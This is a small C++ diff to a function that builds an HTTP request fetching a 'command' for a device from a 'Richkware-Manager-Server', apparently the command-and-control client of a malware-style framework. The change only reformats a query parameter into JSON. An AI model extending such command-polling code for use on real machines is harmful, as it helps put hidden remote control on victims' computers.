@@ -198,7 +198,7 @@ std::string Network::fetchCommand() {
     std::string prt(port);
 
     http::Request request(
-            "http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command?data0=" + device +
+            "http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command?data={\"data0\":\"" + device + "\"}" +
             "&channel=richkware");
 
 //    std::string parameters = "{data0:\"" + device + "\",data1:\"agent\"}";
